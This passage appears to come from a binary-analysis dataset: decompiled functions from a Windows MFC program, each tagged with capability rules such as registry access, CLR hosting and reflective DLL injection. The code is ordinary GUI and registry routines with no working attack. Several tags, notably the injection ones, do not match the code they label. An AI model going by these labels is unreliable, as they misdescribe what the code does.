        "decompiled_code": "\nvoid __fastcall fcn.0045d4f4(code **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t **ppiVar3;\n    \n    *param_1 = vtable.COleDispatchException.0;\n    fcn.00402740();\n    fcn.00402740();\n    ppiVar3 = param_1[3] + -0x10;\n    piVar1 = param_1[3] + -4;\n    LOCK();\n    iVar2 = *piVar1;\n    *piVar1 = *piVar1 + -1;\n    if (iVar2 == 1 || iVar2 + -1 < 0) {\n        (**(**ppiVar3 + 4))(ppiVar3);\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "004265f9": {
        "rules": [
            "create or open registry key",
            "contain loop",
            "query or enumerate registry key"
        ],
        "decompiled_code": "\nvoid fcn.004265f9(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint *in_FS_OFFSET;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t iStack288;\n    uint uStack284;\n    uchar *puStack280;\n    uint uStack272;\n    uint in_stack_fffffef4;\n    \n    uStack272 = 0x18;\n    fcn.004627e2();\n    puStack280 = *param_2;\n    uStack284 = param_1;\n    iStack288 = 0x42663d;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)();\n    if (iVar1 == 0) {\n        do {\n            iStack288 = 0x104;\n            uStack296 = 0;\n            puStack292 = &stack0xfffffef0;\n            iVar1 = (*_sym.imp.ADVAPI32.dll_RegEnumKeyA)(0);\n            if (iVar1 != 0) break;\n            puStack280 = 0x426670;\n            fcn.00413f9d(&stack0xfffffef0);\n            puStack280 = &stack0xfffffedc;\n            uStack284 = 0;\n            iStack288 = 0x426680;\n            iVar1 = fcn.004265f9();\n            iStack288 = 0x426696;\n            fcn.00402740();\n        } while (iVar1 == 0);\n        if ((iVar1 == 0x103) || (iVar1 == 0x3f2)) {\n            iStack288 = *param_2;\n            puStack292 = 0x42665b;\n            uStack296 = 0x4266d6;\n            (*_sym.imp.ADVAPI32.dll_RegDeleteKeyA)();\n        }\n        iStack288 = uStack296;\n        puStack292 = 0x4266e1;\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)();\n    }\n    *in_FS_OFFSET = uStack284;\n    uStack272 = 0x4266fe;\n    fcn.0045e747(in_stack_fffffef4);\n    return;\n}\n",
        "token_count": 483
    },
    "0043c58f": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0043c58f(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_ch = 0;\n    var_4h = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(0x80000001, \"software\", 0, 0x2001f, &var_4h);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCreateKeyExA;\n    if (iVar2 == 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)\n                          (var_4h, *(param_1 + 0x54), 0, 0, 0, 0x2001f, 0, &var_8h, &var_10h);\n        if (iVar2 == 0) {\n            (*pcVar1)(var_8h, *(param_1 + 0x68), 0, 0, 0, 0x2001f, 0, &var_ch, &var_10h);\n        }\n    }\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n    if (var_4h != 0) {\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(var_4h);\n    }\n    if (var_8h != 0) {\n        (*pcVar1)(var_8h);\n    }\n    return var_ch;\n}\n",
        "token_count": 382
    },
    "0043c620": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0043c620(uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    var_4h = 0;\n    iVar1 = fcn.0043c58f();\n    if (iVar1 == 0) {\n        var_4h = 0;\n    }\n    else {\n        (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(iVar1, lpSubKey, 0, 0, 0, 0x2001f, 0, &var_4h, &var_8h);\n        (*_sym.imp.ADVAPI32.dll_RegCloseKey)(iVar1);\n    }\n    return var_4h;\n}\n",
        "token_count": 166
    },
    "0043fbcd": {
        "rules": [
            "create or open registry key",
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nbool __cdecl fcn.0043fbcd(uint hKey, uint arg_ch)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    bool bVar4;\n    uint lpType;\n    uint lpData;\n    uint lpcbData;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar4 = false;\n    var_8h = 0;\n    lpData = fcn.0040f8a0(0x104);\n    pcVar1 = _sym.imp.ADVAPI32.dll_RegOpenKeyA;\n    lpcbData = 0x104;\n    lpType = 0;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyA)(0x80000000, \"CLSID\", &var_8h);\n    if (iVar3 == 0) {\n        var_4h = 0;\n        iVar3 = (*pcVar1)(var_8h, hKey, &var_4h);\n        pcVar2 = _sym.imp.ADVAPI32.dll_RegCloseKey;\n        if (iVar3 == 0) {\n            hKey = 0;\n            iVar3 = (*pcVar1)(var_4h, \"InProcServer32\", &hKey);\n            if (iVar3 == 0) {\n                iVar3 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, 0x4939a0, 0, &lpType, lpData, &lpcbData);\n                bVar4 = iVar3 == 0;\n                (*pcVar2)(hKey);\n            }\n            (*pcVar2)(var_4h);\n        }\n        (*pcVar2)(var_8h);\n    }\n    fcn.00414de4(0xffffffff);\n    return bVar4;\n}\n",
        "token_count": 403
    },
    "004286a7": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004286a7(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.00433216(param_2);\n    *(param_2 + 0x54) = param_1;\n    (**(*param_1 + 0x68))();\n    return;\n}\n",
        "token_count": 72
    },
    "004286c7": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004286c7(int32_t *param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.00433140(param_2, 0);\n    fcn.004330e2(uVar1);\n    *(param_2 + 0x54) = 0;\n    (**(*param_1 + 0x68))();\n    return;\n}\n",
        "token_count": 97
    },
    "0044a465": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a465(int32_t param_1)\n\n{\n    int32_t iStack8;\n    int32_t iStack4;\n    \n    iStack8 = param_1;\n    iStack4 = param_1;\n    fcn.0044a31c();\n    (**(**(param_1 + 0x68) + 0x138))(&iStack8, *(param_1 + 0x40) - *(param_1 + 0x38), 0x42);\n    fcn.004538e5(*(param_1 + 0x68), *(param_1 + 0x48), *(param_1 + 0x4c), *(param_1 + 0x70) & 0x40 | 0x2004);\n    return;\n}\n",
        "token_count": 179
    },
    "0044c767": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044c767(uint arg_8h)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    ppiVar1 = in_ECX + 0x28;\n    piVar2 = *ppiVar1;\n    *(in_ECX + 0x34) = 0;\n    var_4h = in_ECX;\n    if (piVar2 != NULL) {\n        var_4h = 0;\n        var_8h = in_ECX;\n        (**(*piVar2 + 0x20))(piVar2, &var_8h, 0, &var_4h);\n        if (var_4h != 0) {\n            fcn.00431b26(&var_4h);\n        }\n        (**(**ppiVar1 + 0x1c))(*ppiVar1, var_8h, 0, 0);\n        fcn.00431b26(ppiVar1);\n    }\n    ppiVar1 = in_ECX + 0x24;\n    piVar2 = *ppiVar1;\n    if (piVar2 != NULL) {\n        if (*(in_ECX + 0x40) != 0) {\n            (**(*piVar2 + 0x50))(piVar2, *(in_ECX + 0x40));\n            *(in_ECX + 0x40) = 0;\n        }\n        uVar3 = (**(**ppiVar1 + 0x18))(*ppiVar1, arg_8h);\n        *(in_ECX + 0x34) = uVar3;\n        fcn.00431b26(ppiVar1);\n    }\n    fcn.00431b26(in_ECX + 0x38);\n    fcn.00431b26(in_ECX + 0x3c);\n    if (*(in_ECX + 0x60) != 0) {\n        fcn.00431cc2();\n        *(in_ECX + 0x60) = 0;\n        if (*(in_ECX + 100) != 0) {\n            fcn.00431cc2();\n            *(in_ECX + 100) = 0;\n        }\n    }\n    return;\n}\n",
        "token_count": 522
    },
    "00450e75": {
        "rules": [
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00450e75(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    var_4h = (**(*param_1 + 0xb4))();\n    do {\n        if (var_4h == NULL) {\n            return 0;\n        }\n        piVar1 = (**(*param_1 + 0xb8))(&var_4h);\n        iVar2 = (**(*piVar1 + 0x50))();\n    } while (iVar2 == 0);\n    return 1;\n}\n",
        "token_count": 150
    },
    "00443f6a": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00443f6a(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t *in_ECX;\n    uint var_4h;\n    \n    iVar2 = fcn.0043026e();\n    iVar2 = *(iVar2 + 4);\n    iVar1 = in_ECX[0x31];\n    if (arg_8h == 0) {\n        if (*(iVar2 + 0x24) == iVar1) {\n            *(iVar2 + 0x24) = 0;\n        }\n        fcn.0041f821(0);\n        if (*(iVar1 + 0xf8) != 0) {\n            (**(*in_ECX + 0x114))(*(iVar1 + 0xf8), 0);\n        }\n        (**(*in_ECX + 0x114))(*(iVar1 + 0xf4), 0);\n        if (*(iVar1 + 0xf0) != 0) {\n            (**(*in_ECX + 300))(0, *(iVar1 + 0xf0), 0);\n        }\n        (**(*in_ECX + 300))(0, *(iVar1 + 0xec), 1);\n        piVar4 = fcn.0041f9b5();\n        if (piVar4 != NULL) {\n            (**(*piVar4 + 0x160))(0, piVar4, piVar4);\n        }\n        (*_sym.imp.USER32.dll_SendMessageA)(*(iVar1 + 0x20), 6, 0, 0);\n        uVar3 = fcn.0041863f();\n        *(*(iVar1 + 0xf4) + 0x20) = uVar3;\n        if (*(iVar1 + 0xf8) != 0) {\n            uVar3 = fcn.0041863f();\n            *(*(iVar1 + 0xf8) + 0x20) = uVar3;\n        }\n    }\n    else {\n        uVar3 = fcn.0041863f();\n        fcn.00418606(uVar3);\n        if (*(iVar1 + 0xf8) != 0) {\n            uVar3 = fcn.0041863f();\n            fcn.00418606(uVar3);\n        }\n        *(iVar2 + 0x24) = iVar1;\n        iVar2 = *(iVar1 + 0xf8);\n        if (iVar2 != 0) {\n            (**(*in_ECX + 0x114))(iVar2, 1);\n        }\n        (**(*in_ECX + 0x114))(*(iVar1 + 0xf4), 1);\n        fcn.0041f821(1);\n        if (*(iVar1 + 0xf0) != 0) {\n            (**(*in_ECX + 300))(0, *(iVar1 + 0xf0), 0);\n        }\n        (**(*in_ECX + 300))(0, *(iVar1 + 0xec), 1);\n        piVar4 = *(iVar1 + 0xec);\n        (**(*piVar4 + 0x28))(piVar4, *(iVar1 + 0xfc), *(iVar1 + 0x118), *(iVar1 + 0x20));\n        (*_sym.imp.USER32.dll_SendMessageA)(*(iVar1 + 0x20), 6, 1, 0);\n    }\n    return;\n}\n",
        "token_count": 774
    },
    "00459bf9": {
        "rules": [
            "inject DLL reflectively/5c249d14806d4a4ea88afb4f94553771"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00459bf9(int32_t param_1)\n\n{\n    uint lpRect;\n    \n    (**(**(param_1 + 0x7c) + 0x28))(*(param_1 + 0x7c), 1);\n    (*_sym.imp.USER32.dll_GetClientRect)(*(*(param_1 + 0x58) + 0x20), &lpRect);\n    (**(**(param_1 + 0x7c) + 0x18))(*(param_1 + 0x7c), &lpRect);\n    (**(**(param_1 + 0x7c) + 0x24))(*(param_1 + 0x7c), 1);\n    return;\n}\n",
        "token_count": 163
    },
    "00486260": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.00486260(void)\n\n{\n    *0x4b9184 = (*_sym.imp.KERNEL32.dll_CreateFileA)(\"CONOUT$\", 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 61
    },
    "00410d40": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00410d40(code **param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    \n    *param_1 = vtable.CTrackerView.0;\n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = fcn.0042fcbb();\n    while (*(iVar2 + 0xe4) == extraout_ECX) {\n        puVar1 = *(iVar2 + 0xe8);\n        *(puVar1[1] + 0xe4) = *puVar1;\n        *(puVar1[1] + 0xe8) = puVar1[2];\n        puVar1[1] = 0;\n    }\n    if (*(extraout_ECX + 0x54) != 0) {\n        fcn.004286c7(extraout_ECX);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00418ff3();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 274
    },
    "00411579": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00411579(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    while( true ) {\n        iVar1 = fcn.0045ea05(param_1);\n        if (iVar1 != 0) {\n            return iVar1;\n        }\n        if (*0x4b6000 == NULL) break;\n        iVar1 = (**0x4b6000)(param_1);\n        if (iVar1 == 0) {\n            return 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "0041367c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0041367c(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (param_1 == 0) {\n        return;\n    }\n    if (param_1 == 0xc) {\n        uVar1 = 0x8007000e;\n    }\n    else {\n        if (param_1 == 0x16) goto code_r0x004136a2;\n        if (param_1 == 0x22) goto code_r0x004136a2;\n        if (param_1 == 0x50) {\n            return;\n        }\n        uVar1 = 0x80004005;\n    }\n    do {\n        fcn.00401280(uVar1);\ncode_r0x004136a2:\n        uVar1 = 0x80070057;\n    } while( true );\n}\n",
        "token_count": 188
    },
    "004147c1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004147c1(int32_t *arg_8h, int32_t arg_ch, int32_t *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    piVar2 = arg_8h;\n    fcn.004146d0(arg_ch);\n    fcn.0041bcf0(arg_ch, &arg_8h);\n    if (*piVar2 != 0) {\n        *arg_10h = -1;\n    }\n    pcVar1 = _sym.imp.USER32.dll_SendMessageA;\n    arg_ch = 0;\n    while( true ) {\n        uVar3 = (*pcVar1)(arg_8h, 0x87, 0, 0);\n        if ((uVar3 & 0x40) != 0) {\n            if (*piVar2 == 0) {\n                (*pcVar1)(arg_8h, 0xf1, arg_ch == *arg_10h, 0);\n            }\n            else {\n                iVar4 = (*pcVar1)(arg_8h, 0xf0, 0, 0);\n                if (iVar4 != 0) {\n                    *arg_10h = arg_ch;\n                }\n            }\n            arg_ch = arg_ch + 1;\n        }\n        arg_8h = (*_sym.imp.USER32.dll_GetWindow)(arg_8h, 2);\n        if (arg_8h == NULL) break;\n        uVar3 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_8h, 0xfffffff0);\n        if ((uVar3 & 0x20000) != 0) {\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 399
    },
    "00416e0d": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00416e0d(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t *extraout_ECX;\n    \n    iVar1 = 0x7fffffff;\n    if (param_2 == 0x7fffffff) goto code_r0x00416e2c;\n    if (*param_1 == 0x7fffffff) goto code_r0x00416e2a;\n    if (*param_1 == param_2) goto code_r0x00416e2a;\n    do {\n        iVar1 = fcn.00411e42();\n        param_1 = extraout_ECX;\ncode_r0x00416e2a:\n        *param_1 = param_2;\ncode_r0x00416e2c:\n    } while (*param_1 == iVar1);\n    fcn.0043039f(*param_1);\n    return;\n}\n",
        "token_count": 210
    },
    "0041708f": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041708f(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    if (arg_8h == 0) {\n        fcn.00411e42();\n    }\n    iVar1 = (*_sym.imp.USER32.dll_GetMenuItemCount)(*(arg_8h + 4));\n    iVar3 = 0;\n    if (0 < iVar1) {\n        do {\n            iVar2 = fcn.00416cd3(iVar3);\n            if (iVar2 == 0) {\n                iVar2 = (*_sym.imp.USER32.dll_GetMenuItemID)(*(arg_8h + 4), iVar3);\n                if (iVar2 == arg_ch) goto code_r0x004170f1;\n            }\n            else {\n                if (*(iVar2 + 4) == arg_ch) {\ncode_r0x004170f1:\n                    iVar1 = fcn.00432152(*(arg_8h + 4));\n                    return iVar1;\n                }\n                iVar2 = fcn.0041708f(iVar2, arg_ch);\n                if (iVar2 != 0) {\n                    return iVar2;\n                }\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < iVar1);\n    }\n    return 0;\n}\n",
        "token_count": 306
    },
    "004188e0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004188e0(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    if ((param_1 == 0) || (iVar5 = *(param_1 + 0x20),  iVar5 == 0)) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0);\n    while ((uVar2 & 0x40000000) != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar5);\n        if (iVar3 == 0) break;\n        uVar2 = (*pcVar1)(iVar3, 0xfffffff0);\n        iVar5 = iVar3;\n    }\n    uVar4 = fcn.004185c5(iVar5);\n    return uVar4;\n}\n",
        "token_count": 235
    },
    "00418942": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00418942(uint hDlg, uint nIDDlgItem, int32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar2 = (*_sym.imp.USER32.dll_GetDlgItem)(hDlg, nIDDlgItem);\n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.USER32.dll_GetTopWindow)(iVar2);\n        if ((iVar3 != 0) && (iVar3 = fcn.00418942(iVar2, nIDDlgItem, arg_10h),  iVar3 != 0)) {\n            return;\n        }\n        if (arg_10h == 0) {\n            fcn.004185c5();\n            return;\n        }\n        iVar2 = fcn.004185ec(iVar2);\n        if (iVar2 != 0) {\n            return;\n        }\n    }\n    iVar2 = (*pcVar1)(hDlg);\n    while( true ) {\n        if (iVar2 == 0) {\n            return;\n        }\n        iVar3 = fcn.00418942(iVar2, nIDDlgItem, arg_10h);\n        if (iVar3 != 0) break;\n        iVar2 = (*_sym.imp.USER32.dll_GetWindow)(iVar2, 2);\n    }\n    return;\n}\n",
        "token_count": 314
    },
    "00418b03": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00418b03(uint param_1, int32_t *param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar3 = *param_2;\n    while( true ) {\n        if (iVar3 == 0) {\n            return 0;\n        }\n        piVar1 = fcn.004185ec(iVar3);\n        if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x100))(param_2),  iVar2 != 0)) break;\n        if (iVar3 == unaff_retaddr) {\n            return 0;\n        }\n        iVar3 = (*_sym.imp.USER32.dll_GetParent)(iVar3);\n    }\n    return 1;\n}\n",
        "token_count": 185
    },
    "00418ccf": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00418ccf(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint lpMsg;\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        iVar2 = (*pcVar1)(&lpMsg, 0, 0x121, 0x121, 1);\n        if (iVar2 == 0) break;\n        (*_sym.imp.USER32.dll_DispatchMessageA)(&lpMsg);\n    }\n    fcn.00418521();\n    return;\n}\n",
        "token_count": 126
    },
    "00419143": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00419143(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetParent;\n    if ((param_1 != 0) && (iVar2 = *(param_1 + 0x20),  iVar2 != 0)) {\n        while( true ) {\n            uVar3 = (*pcVar1)(iVar2);\n            piVar4 = fcn.004185c5(uVar3);\n            if ((piVar4 == NULL) || (iVar2 = (**(*piVar4 + 0x120))(),  iVar2 != 0)) break;\n            iVar2 = piVar4[8];\n        }\n        return piVar4;\n    }\n    return NULL;\n}\n",
        "token_count": 193
    },
    "00419335": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00419335(int32_t param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = 0;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindow)(*(param_1 + 0x20), 5);\n    iVar3 = fcn.004185c5(uVar2);\n    while (iVar3 != 0) {\n        uVar2 = (*pcVar1)(*(iVar3 + 0x20), 2);\n        iVar3 = fcn.004185c5(uVar2);\n        iVar4 = iVar4 + 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 177
    },
    "00419eed": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00419eed(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    if ((param_1 != 0) && (iVar1 = *(param_1 + 0x20),  *(param_1 + 0x20) != 0)) {\n        do {\n            iVar3 = iVar1;\n            iVar1 = fcn.00419ea8(iVar3);\n        } while (iVar1 != 0);\n        uVar2 = fcn.004185c5(iVar3);\n        return uVar2;\n    }\n    return 0;\n}\n",
        "token_count": 145
    },
    "0041f790": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0041f790(int32_t param_1, int32_t param_2)\n\n{\n    do {\n        if (param_1 == param_2) {\n            return 1;\n        }\n        param_2 = fcn.00419ea8();\n    } while (param_2 != 0);\n    return 0;\n}\n",
        "token_count": 76
    },
    "004221c9": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.004221c9(void)\n\n{\n    int32_t iVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(4);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CFrameWnd.0;\n    *(unaff_EBP + -4) = 2;\n    fcn.00421db1();\n    iVar1 = fcn.0042fcbb();\n    while (*(iVar1 + 0xec) == extraout_ECX) {\n        fcn.0041ffc8();\n    }\n    if (extraout_ECX[0x2f] != NULL) {\n        fcn.004115a4(extraout_ECX[0x2f]);\n    }\n    fcn.00402740();\n    *(unaff_EBP + -4) = 0;\n    fcn.00433188();\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00418ff3();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 276
    },
    "0042242c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.0042242c(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    code *pcVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    int32_t *piVar9;\n    uint *puVar10;\n    int32_t **ppiVar11;\n    uint extraout_ECX;\n    uint32_t uVar12;\n    int32_t unaff_EBP;\n    uint32_t uVar13;\n    uint *in_FS_OFFSET;\n    uint32_t uVar14;\n    \n    fcn.004627af(0xf4);\n    *(unaff_EBP + 0x60) = extraout_ECX;\n    uVar4 = fcn.0042407a();\n    fcn.0040f840(uVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_lstrlenA;\n    *(unaff_EBP + -4) = 0;\n    iVar5 = (*pcVar2)(\"ReBarWindow32\");\n    uVar4 = fcn.0040f8a0(iVar5 + 1);\n    puVar10 = *(unaff_EBP + 0x74);\n    (*_sym.imp.USER32.dll_GetClassNameA)(*puVar10, uVar4, iVar5 + 1);\n    fcn.00414de4(0xffffffff);\n    uVar4 = fcn.004185ec(*puVar10);\n    *(unaff_EBP + 0x74) = uVar4;\n    iVar5 = fcn.004126f7(\"ReBarWindow32\");\n    if ((iVar5 == 0) && (iVar5 = *(unaff_EBP + 0x74),  iVar5 != 0)) {\n        iVar6 = fcn.0042f538(0x498050);\n        if (iVar6 != 0) {\n            iVar6 = fcn.00419143();\n            if ((iVar6 != 0) && (*(unaff_EBP + 0x60) != iVar6)) {\n                uVar4 = fcn.0042242c(*(unaff_EBP + 0x70), puVar10, *(unaff_EBP + 0x78));\n                goto code_r0x004224df;\n            }\n            fcn.004321fe();\n            *(unaff_EBP + -4) = 1;\n            uVar4 = fcn.0042407a();\n            fcn.0040f840(uVar4);\n            *(unaff_EBP + -4) = 2;\n            uVar4 = fcn.0042407a();\n            fcn.0040f840(uVar4);\n            *(unaff_EBP + -4) = 3;\n            fcn.0042d958();\n            *(unaff_EBP + -4) = 4;\n            fcn.0042e204(*(unaff_EBP + 0x60));\n            pcVar3 = _sym.imp.USER32.dll_SendMessageA;\n            uVar4 = puVar10[3];\n            uVar1 = *(iVar5 + 0x20);\n            *(unaff_EBP + -4) = 5;\n            *(unaff_EBP + -0x100) = 0x50;\n            *(unaff_EBP + -0xfc) = 0x10;\n            (*pcVar3)(uVar1, 0x41d, uVar4, unaff_EBP + -0x100);\n            (*pcVar3)(*(*(unaff_EBP + 0x74) + 0x20), 0x409, puVar10[3], unaff_EBP + -0x1c);\n            iVar5 = (*pcVar2)(\"ToolbarWindow32\");\n            uVar4 = fcn.0040f8a0(iVar5 + 1);\n            (*_sym.imp.USER32.dll_GetClassNameA)(*(unaff_EBP + -0xe0), uVar4, iVar5 + 1);\n            fcn.00414de4(0xffffffff);\n            iVar5 = fcn.004185ec(*(unaff_EBP + -0xe0));\n            *(unaff_EBP + 0x20) = iVar5;\n            iVar6 = fcn.004126f7();\n            if ((iVar6 == 0) && (iVar5 != 0)) {\n                iVar6 = fcn.0042f538(0x493cf4);\n                if (iVar6 != 0) {\n                    *(unaff_EBP + -0x14) = puVar10[6];\n                    *(unaff_EBP + 0x24) = puVar10 + 6;\n                    fcn.0042ddc6(unaff_EBP + -0x1c);\n                    fcn.0042dd8a(unaff_EBP + -0x1c);\n                    iVar6 = fcn.0041df89();\n                    *(unaff_EBP + 0x58) = iVar6;\n                    do {\n                        iVar6 = iVar6 + -1;\n                        uVar4 = *(iVar5 + 0x20);\n                        *(unaff_EBP + 0x74) = iVar6;\n                        (*pcVar3)(uVar4, 0x41d, iVar6, unaff_EBP + -0x80);\n                        iVar7 = (*_sym.imp.USER32.dll_IntersectRect)\n                                          (unaff_EBP + -0x90, unaff_EBP + -0x1c, unaff_EBP + -0x80);\n                        if (iVar7 != 0) break;\n                    } while (iVar6 != 0);\n                    fcn.00462290(unaff_EBP + -0x70, 0, 0x30);\n                    *(unaff_EBP + -0x70) = 0x30;\n                    iVar5 = fcn.00420006();\n                    fcn.004349d8();\n                    *(unaff_EBP + 0x3c) = vtable.CTypedPtrArray_class_CObArray__class_CBitmap__.0;\n                    uVar14 = *(unaff_EBP + 0x74);\n                    *(unaff_EBP + -4) = 6;\n                    fcn.004349ff(*(unaff_EBP + 0x58) - uVar14, 0xffffffff);\n                    uVar4 = (*_sym.imp.USER32.dll_CreatePopupMenu)();\n                    fcn.0043216c(uVar4);\n                    fcn.0041fe6b(unaff_EBP + -0x30);\n                    uVar12 = 0;\n                    if (uVar14 < *(unaff_EBP + 0x58)) {\n                        do {\n                            fcn.0041dd88(*(unaff_EBP + 0x74), unaff_EBP + 0x54, unaff_EBP + 0x38, unaff_EBP + 0x50);\n                            if ((*(unaff_EBP + 0x38) & 1) == 0) {\n                                *(unaff_EBP + -0x6c) = 0x162;\n                                fcn.0040f670(*(unaff_EBP + 0x54));\n                                fcn.00423f9a(unaff_EBP + 0x5c, *(unaff_EBP + 0x70), 1, 10);\n                                ppcVar8 = fcn.00411579(8);\n                                if (ppcVar8 == NULL) {\n                                    ppcVar8 = NULL;\n           